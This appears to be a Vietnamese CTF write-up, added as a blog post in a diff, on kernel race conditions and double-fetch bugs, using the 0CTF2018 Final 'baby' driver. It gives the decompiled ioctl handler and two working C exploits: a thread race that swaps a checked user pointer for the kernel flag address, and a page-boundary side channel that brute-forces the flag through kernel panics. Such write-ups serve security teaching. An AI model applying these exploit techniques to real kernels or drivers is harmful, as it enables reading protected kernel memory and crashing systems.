@@ -1,0 +1,281 @@
+
+--- 
+title: Race-condition
+date: 2025-05-18 00:00:00 +0800
+description: 'No description'
+tags: ['kernel','research']
+author: ['kuvee']
+draft: false
+---
+
+
+- trong pwn userland thì đa số chỉ có 1 luồng chính chạy độc lập và không có cái gọi là race-condtion . nhưng trong pwn kernel thì attack chịu trách nhiệm viết các chương trình -> có thể dễ dàng khởi động nhiều luồng chạy đồng thời , do đó xảy ra `race-condition`
+
+## double-fetch 
+
+- theo nghĩa đen là lấy giá trị của 1 đối tượng hai (hoặc nhiều lần) trong 1 thao tác , các trường hợp có thể xảy ra: 
+
+
+
+như trong hình có 1 lượng lớn dữ liệu cần chuyển từ user->kernel , tuy nhiên việc chuyển toàn bộ dữ liệu là rất lớn , do đó người ta chỉ cần chuyển 1 con trỏ địa chỉ của user-land tới kernel , và quá trình này thì kernel sẽ sử dụng con trỏ này nhiều lần 
+
+- lần đầu kernel sẽ lấy dữ liệu để check , lần 2 sẽ lấy để dùng 
+
+![image](https://hackmd.io/_uploads/Sk6_NhOOeg.png)
+
+và sẽ không khó để sau khi check thành công thì attacker có thể fake bằng 1 dữ liệu mới 
+
+![image](https://hackmd.io/_uploads/H1NFB3OOxg.png)
+
+
+
+## 0CTF2018 Final 
+
+
+- đoạn code yêu cầu dùng `ioctl` để giao tiếp với driver , ở đây sẽ có 2 options , `0x6666` sẽ in địa chỉ của flag ở kernel 
+
+```c
+__int64 __fastcall baby_ioctl(__int64 a1, __int64 n4919)
+{
+  __int64 v2; // rdx
+  int i; // [rsp-5Ch] [rbp-5Ch]
+  flag_str *flag_str; // [rsp-58h] [rbp-58h]
+
+  _fentry__(a1, n4919);
+  flag_str = (flag_str *)v2;
+  if ( (_DWORD)n4919 == 0x6666 )
+  {
+    printk("Your flag is at %px! But I don't think you know it's content\n", flag);// "flag{THIS_WILL_BE_YOUR_FLAG_1234}"
+    return 0;
+  }
+  else if ( (_DWORD)n4919 == 0x1337
+         && !_chk_range_not_ok(v2, 16, *(_QWORD *)(__readgsqword((unsigned int)&current_task) + 4952))
+         && !_chk_range_not_ok(
+               (__int64)flag_str->flag,
+               flag_str->flag_len,
+               *(_QWORD *)(__readgsqword((unsigned int)&current_task) + 4952))
+         && flag_str->flag_len == strlen(flag) )// "flag{THIS_WILL_BE_YOUR_FLAG_1234}"
+  {
+    // "flag{THIS_WILL_BE_YOUR_FLAG_1234}"
+    for ( i = 0; i < strlen(flag); ++i )
+    {
+      if ( flag_str->flag[i] != flag[i] )       // "flag{THIS_WILL_BE_YOUR_FLAG_1234}"
+        return 22;
+    }
+    printk("Looks like the flag is not a secret anymore. So here is it %s\n", flag);// "flag{THIS_WILL_BE_YOUR_FLAG_1234}"
+    return 0;
+  }
+  else
+  {
+    return 14;
+  }
+}
+```
+
+`_chk_range_not_ok` : hàm này sẽ check xem địa chỉ flag có hợp lệ không , `a1` sẽ là địa chỉ bắt đầu , `n` là độ dài 
+
+```c
+bool __fastcall _chk_range_not_ok(__int64 a1, __int64 n16, unsigned __int64 a3)
+{
+  bool v3; // cf
+  unsigned __int64 v4; // rdi
+
+  v3 = __CFADD__(n16, a1);
+  v4 = n16 + a1;
+  return v3 || a3 < v4;
+}
+```
+
+nó sẽ trông như sau: `limit` = giới hạn trên cho các địa chỉ hợp lệ (`current->addr_limit`)
+
+```c
+bool __fastcall _chk_range_not_ok(__int64 a1, __int64 n, unsigned __int64 limit)
+{
+  bool v3;                 // cờ carry (overflow) khi cộng
+  unsigned __int64 sum;    // a1 + n
+
+  v3 = __CFADD__(n, a1);   // 1 nếu a1 + n bị overflow (unsigned)
+  sum = n + a1;
+  return v3 || limit < sum;
+}
+```
+
+nói chung là nó sẽ tránh ta gửi 1 địa chỉ như kernel để tránh đọc flag :3 
+
+- 1 bài khá ngắn và có lẽ là 1 bài điển hình `race-condtion` vì không thực hiện bất kì cơ chế nào để tránh `vuln` này (mutex , semaphore)
+
+- vậy ý tưởng sẽ là như sau: 
+
+ta sẽ tạo thêm 1 luồng để `race-flag` , luồng này chịu trách nhiệm đặt địa chỉ flag ở kernel , luồng chính sẽ thực hiện đặt 1 địa chỉ flag user-land , nếu nó thõa đoạn check -> tiếp theo luồng `race` sẽ thay đổi nó thành địa chỉ kernel -> ta có thể đọc flag 
+
+
+```c
+#include <assert.h>
+#include <fcntl.h>
+#include <pthread.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/ioctl.h>
+#include <unistd.h>
+#define SUCCESS_MSG(msg) "\033[32m\033[1m" msg "\033[0m"
+#define INFO_MSG(msg) "\033[34m\033[1m" msg "\033[0m"
+#define ERROR_MSG(msg) "\033[31m\033[1m" msg "\033[0m"
+
+#define log_success(msg) puts(SUCCESS_MSG(msg))
+#define log_info(msg) puts(INFO_MSG(msg))
+#define log_error(msg) puts(ERROR_MSG(msg))
+
+pthread_t race_thread;
+void *flag_kaddr;
+char fakeflag[0x1000] = "flag{i_think_this_is_not_really_a_flag}";
+int check_flag = 1;
+int race_times = 0x1000;
+
+typedef struct {
+  char *flag_addr;
+  int len_flag;
+} flags;
+
+flags flagggg = {.flag_addr = fakeflag, .len_flag = 33};
+
+void *race_flag(void *args) {
+  while (check_flag) {
+    for (int i = 0; i < race_times; i++) {
+      flagggg.flag_addr = flag_kaddr;
+    }
+  }
+  return NULL;
+}
+
+void print_flag(int fd) { ioctl(fd, 0x6666); }
+
+void chal_verify_flag(int fd, flags *flags) { ioctl(fd, 0x1337, flags); }
+void exploit(void) {
+  int fd = open("/dev/baby", O_RDWR);
+  if (fd < 0) {
+    perror(ERROR_MSG("open failed"));
+    exit(EXIT_FAILURE);
+  }
+  // get addr flag 
+  print_flag(fd);
+  system("dmesg | grep -i flag > /tmp/flag.txt");
+    
+  int flag_fd = open("/tmp/flag.txt", O_RDWR);
+  if (flag_fd < 0) {
+    perror(ERROR_MSG("open flag"));
+    exit(-1);
+  }
+    
+  char *tmp_buf = malloc(0x1000);
+  tmp_buf[read(flag_fd, tmp_buf, 0x1000)] = '\0';
+  // flag_kaddr = ki tu sau chuoi nay
+  char *flag_addr_kaddr =
+      strstr(tmp_buf, "Your flag is at ") + strlen("Your flag is at ");
+  flag_kaddr =
+      (void *)strtoull(flag_addr_kaddr, (void *)(flag_addr_kaddr + 16), 16);
+  printf(SUCCESS_MSG("[+] flag addr: ") "%p\n", flag_kaddr);
+  // start race
+  pthread_create(&race_thread, NULL, race_flag, NULL);
+  memset(tmp_buf, 0, 0x1000);
+  while (check_flag) {
+    for (int i = 0; i < race_times; i++) {
+      // luong chinh -> bypass check
+      flagggg.flag_addr = fakeflag;
+      chal_verify_flag(fd, &flagggg);
+    }
+    // check xem thanh cong chua 
+    system("dmesg | grep flag > /tmp/result.txt");
+
+    int fd2 = open("/tmp/result.txt", O_RDONLY);
+    read(fd2, tmp_buf, 0x1000);
+    if (strstr(tmp_buf, "flag{")) {
+      check_flag = 0;
+    }
+  }
+  // xu ly flag 
+  pthread_cancel(race_thread);
+  log_success("[+] race done");
+  system("dmesg | grep -i flag > /tmp/flag.txt");
+  int flag = open("/tmp/flag.txt", O_RDONLY);
+  if (flag < 0) {
+    log_error("open flag.txt failed");
+    exit(-1);
+  }
+  tmp_buf[read(flag, tmp_buf, 0x1000)] = '\0';
+  char *flag_value =
+      strstr(tmp_buf, "So here is it ") + strlen("So here is it ");
+  fflush(stdout);
+  for (int i = 0; flag_value[i] && flag_value[i] != '\n'; i++) {
+    putchar(flag_value[i]);
+  }
+  puts("");
+}
+
+int main() { 
+    exploit(); 
+}
+
+```
+
+
+![image](https://hackmd.io/_uploads/Hy0Oqpudee.png)
+
+- ý tưởng thứ hai ở đây sẽ là `side-channel` , ở đây ta sẽ `mmap` 1 địa chỉ , sau đó idea sẽ là nếu địa chỉ chứa chuỗi flag hợp lệ , nó sẽ thực hiện tham chiếu đến kí tự kế tiếp và tại địa chỉ đó nó chưa được allocated -> kernel panic , ta có thể tận dụng điều này để brute từng kí tự 
+
+
+![image](https://hackmd.io/_uploads/rJlQTaudll.png)
+
+
+- như hình bên dưới thì kí tự T là 1 kí tự hợp lệ -> nó sẽ tham chiếu đến kí tự tiếp theo và `kernel panic` sẽ xảy ra 
+
+![image](https://hackmd.io/_uploads/By8GAad_gl.png)
+
+exp:
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <pthread.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <sys/ioctl.h>
+#include <sys/mman.h>
+typedef struct flag_info {
+        char* flag_ptr;
+        int flag_len;
+}flag_info;
+
+flag_info flag;
+
+int main(int argc, char** argv, char** env)
+{
+        int fd = open("/dev/baby", 2);
+        flag.flag_len = 33;
+        if (argc < 2)
+        {
+                puts("usage: ./exp flag_str");
+                exit(-1);
+        }
+        int flag_len = strlen(argv[1]);
+        char *buf = mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_SHARED, -1, 0);
+        char *flag_addr = buf + 4096 - flag_len;
+        memcpy(flag_addr, argv[1], flag_len);
+        flag.flag_ptr = flag_addr;
+        ioctl(fd, 0x1337, &flag);
+        return 0;
+}
+```
+note: 
+
+```
+Kernel panic là trạng thái lỗi nghiêm trọng khi kernel phát hiện một điều kiện không thể phục hồi an toàn. Để tránh làm hỏng dữ liệu hoặc tiếp tục chạy trong trạng thái sai, kernel dừng hệ thống ngay (treo, in stack trace, rồi đứng yên hoặc tự reboot tùy cấu hình).
+```
+
+```
+kernel oops : khi gặp lỗi không đáng kể -> vẫn tiếp tục chạy (kill process gây lỗi và in "call trace") nếu panic_on_warn=1 thì biến thành panic
+```
